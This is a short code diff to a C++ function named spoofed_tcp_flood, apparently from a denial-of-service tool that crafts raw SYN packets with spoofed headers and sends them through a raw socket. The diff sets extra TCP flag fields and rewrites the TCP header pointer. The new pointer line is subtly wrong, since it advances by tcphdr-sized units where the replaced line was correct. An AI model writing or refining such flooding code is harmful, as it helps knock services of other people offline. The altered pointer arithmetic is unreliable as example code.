@@ -455,7 +455,7 @@ void Doser::spoofed_tcp_flood(const int *id) {
     std::string message{};
     char buf[8192];
     auto *ip = (struct iphdr *)buf;
-    auto *tcp = (struct tcphdr *)(ip + 1);
+    auto *tcp = (struct tcphdr *)buf + sizeof (struct ip);
     struct hostent *hp;
     struct sockaddr_in dst{};
     auto s_port = randomInt(0, 65535);
@@ -506,12 +506,20 @@ void Doser::spoofed_tcp_flood(const int *id) {
             tcp->ack = 0;
             tcp->doff = 5;
             tcp->syn = 1;
+            tcp->res1 = 0;
+            tcp->urg = 0;
+            tcp->psh = 0;
+            tcp->rst = 0;
+            tcp->fin = 0;
             tcp->ack_seq = 0;
             tcp->window = htons(32767);
             tcp->check = 0;
             tcp->urg_ptr = 0;
-            tcp->check = 0;//htons(checksum((unsigned short *) buf, (sizeof(struct ip) + sizeof(struct tcphdr))));
+            tcp->check = 0;
+
             ip->check = checksum((unsigned short *)buf, ip->tot_len >> 1);
+
+
             if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0){
                 logger->Log("setsockopt() error", Logger::Error);
                 exit(EXIT_FAILURE);
